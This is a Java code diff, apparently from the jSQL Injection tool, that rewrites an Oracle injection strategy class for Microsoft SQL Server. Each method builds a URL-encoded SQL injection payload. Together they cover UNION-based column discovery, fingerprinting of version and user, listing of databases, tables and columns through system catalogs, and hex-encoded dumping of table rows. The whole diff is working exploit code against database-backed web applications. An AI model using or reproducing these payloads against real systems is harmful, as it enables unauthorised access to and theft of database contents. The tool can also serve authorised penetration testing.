@@ -10,74 +10,89 @@ import com.jsql.model.blind.ConcreteTimeInjection;
 import com.jsql.model.injection.MediatorModel;
 import com.jsql.tool.ToolsString;
 
-public class OracleStrategy implements ISQLStrategy {
+public class MSSQLServerStrategy implements ISQLStrategy {
 
     @Override
     public String getSchemaInfos() {
-        return "SELECT+rawtohex(version||'{%}'||SYS.DATABASE_NAME||'{%}'||user||'{%}'||user)||'i'FROM+v%24instance";
+        return
+            "SELECT+" +
+                "CAST(N''AS+XML).value('xs:hexBinary(sql:column(\"bin\"))','VARCHAR(MAX)')%2B'i'" +
+            "FROM(" +
+                "SELECT+CAST((cast(@@version%2B'{%}'%2BDB_NAME()%2B'{%}'%2Buser%2B'{%}'%2Buser_name()AS+VARCHAR(MAX)))AS+VARBINARY(MAX))AS+bin" +
+            ")x";
     }
 
     @Override
     public String getSchemaList() {
         return
-            "select+" +
-                "replace(" +
-                    "replace(" +
-                        "XmlAgg(" +
-                            "XmlElement(\"a\",'hh'||rawtohex(owner)||'jj'||'30'||'hh')order+by+owner+nulls+last" +
-                        ").getClobVal()," +
-                    "'<a>','')," +
-                "'<%2Fa>','gg')" +
-                "||'i'" +
-            "from(SELECT+distinct+owner+FROM+all_tables+where+1=1+{limit})";
+            "SELECT+" +
+                "replace(STUFF(" +
+                    "(" +
+                        "SELECT" +
+                            "+','%2b'hh'%2Breplace(sys.fn_varbintohexstr(CAST(CAST(name+AS+VARCHAR(MAX))AS+VARBINARY(MAX))),'0x','')%2B'jj30hh'" +
+                        "FROM+" +
+                            "(select+name,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+from+master..sysdatabases)x+" +
+                        "where+1=1+{limit}+FOR+XML+PATH('')" +
+                    ")" +
+                ",1,1,'')%2B'i',',','gg')";
     }
 
     @Override
     public String getTableList(Database database) {
         return
-            "select+" +
-                "replace(" +
-                    "replace(" +
-                        "XmlAgg(" +
-                            "XmlElement(\"a\",'hh'||rawtohex(table_name)||'jj'||'30'||'hh')order+by+table_name+nulls+last" +
-                        ").getClobVal()," +
-                    "'<a>','')," +
-                "'<%2Fa>','gg')" +
-                "||'i'" +
-            "from(SELECT+distinct+table_name+FROM+all_tables+where+owner='" + database + "'{limit})";
+            "SELECT+" +
+                "replace(STUFF(" +
+                    "(" +
+                        "SELECT" +
+                            "+','%2b'hh'%2Breplace(sys.fn_varbintohexstr(CAST(CAST(name+AS+VARCHAR(MAX))AS+VARBINARY(MAX))),'0x','')%2B'jj30hh'" +
+                        "FROM+" +
+                            "(select+name,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+from+"+ database + "..sysobjects+WHERE+xtype='U')x+" +
+                        "WHERE+1=1+{limit}+FOR+XML+PATH('')" +
+                    ")" +
+                ",1,1,'')%2B'i',',','gg')";
     }
 
     @Override
     public String getColumnList(Table table) {
         return
-            "select+" +
-                "replace(" +
-                    "replace(" +
-                        "XmlAgg(" +
-                            "XmlElement(\"a\",'hh'||rawtohex(column_name)||'jj'||'30'||'hh')order+by+column_name+nulls+last" +
-                        ").getClobVal()," +
-                    "'<a>','')," +
-                "'<%2Fa>','gg')" +
-                "||'i'" +
-            "from(SELECT+distinct+column_name+FROM+all_tab_columns+where+owner='" + table.getParent() + "'and+table_name='" + table + "'{limit})";
+            "SELECT+" +
+                "replace(STUFF(" +
+                    "(" +
+                        "SELECT" +
+                            "+','%2b'hh'%2Breplace(sys.fn_varbintohexstr(CAST(CAST(name+AS+VARCHAR(MAX))AS+VARBINARY(MAX))),'0x','')%2B'jj30hh'" +
+                        "FROM+(select+c.name,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+" +
+                        "FROM+" +
+                            table.getParent() + "..syscolumns+c," +
+                            table.getParent() + "..sysobjects+t+" +
+                        "WHERE+" +
+                            "c.id=t.id+" +
+                        "AND+t.name='" + table + "')x+" +
+                            
+                        "WHERE+1=1+{limit}+FOR+XML+PATH('')" +
+                    ")" +
+                ",1,1,'')%2B'i',',','gg')";
     }
 
     @Override
     public String getValues(String[] columns, Database database, Table table) {
-        String formatListColumn = ToolsString.join(columns, ")||chr(127)||trim(");
-        formatListColumn = "trim(" + formatListColumn + ")";
-        
+        String formatListColumn = ToolsString.join(columns, "))%2bchar(127)%2bLTRIM(RTRIM(");
+        formatListColumn = "LTRIM(RTRIM(" + formatListColumn + "))";
+
         return
-            "select+" +
-                "replace(" +
-                    "replace(" +
-                        "XmlAgg(" +
-                            "XmlElement(\"a\",'hh'||rawtohex(" + formatListColumn + ")||'jj'||'30'||'hh')order+by+" + ToolsString.join(columns, ",") + "+nulls+last" +
-                        ").getClobVal()," +
-                    "'<a>','')," +
-                "'<%2Fa>','gg')" +
-                "||'i'" +
-            "from(SELECT+distinct+" + ToolsString.join(columns, ",") + "+FROM+" + database + "." + table + "+where+1=1+{limit})";
+            "SELECT+" +
+                "replace(STUFF(" +
+                    "(" +
+                        "SELECT" +
+                            "+','%2b'hh'%2Breplace(sys.fn_varbintohexstr(CAST(CAST(" + 
+                            formatListColumn + 
+                            "+AS+VARCHAR(MAX))AS+VARBINARY(MAX))),'0x','')%2B'jj30hh'" +
+                        "FROM+(select+*,ROW_NUMBER()OVER(ORDER+BY(SELECT+1))AS+rnum+" +
+                        
+                        "FROM+" +
+                            database + ".dbo." + table + "+)x+" +
+                        "WHERE+1=1+{limit}+FOR+XML+PATH('')" +
+                    ")" +
+                ",1,1,'')%2B'i',',','gg')";
     }
 
     @Override
@@ -233,12 +248,7 @@ public class OracleStrategy implements ISQLStrategy {
     @Override
     public String normalStrategy(String sqlQuery, String startPosition) {
         return 
-            "select+*+from(select+" +
-                "replace('SQLi'||substr(" +
-                    "(" + sqlQuery + ")," +
-                    startPosition + "," +
-                    "3996" +
-                "),'SQLii','')from+dual)x";
+            "select'SQLi'%2Bsubstring((" + sqlQuery + ")," + startPosition + ",65536)";
     }
 
     @Override
@@ -263,7 +273,7 @@ public class OracleStrategy implements ISQLStrategy {
         return 
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
-                "(select'SQLi'||rpad('#',1024,'#')||'iLQS'from+dual)"
+                "(select+concat('SQLi',$1,replicate(0xb8,1024),'iLQS'))"
             );
     }
 
@@ -271,9 +281,9 @@ public class OracleStrategy implements ISQLStrategy {
     public String initialQuery(Integer nbFields) {
         List<String> fields = new ArrayList<String>(); 
         for (int i = 1 ; i <= nbFields ; i++) {
-            fields.add("to_char(1337"+ i +"7330%2b1)");
+            fields.add("1337"+ i +"7330%2b1");
         }
-        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "from+dual--+";
+        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "--+";
     }
 
     @Override
@@ -283,7 +293,7 @@ public class OracleStrategy implements ISQLStrategy {
 
     @Override
     public String getLimit(Integer limitSQLResult) {
-        return "+and+rownum+between+" + limitSQLResult + "+and+65536";
+        return "and+rnum+BETWEEN+" + (limitSQLResult+1) + "+AND+65536";
     }
 
 }
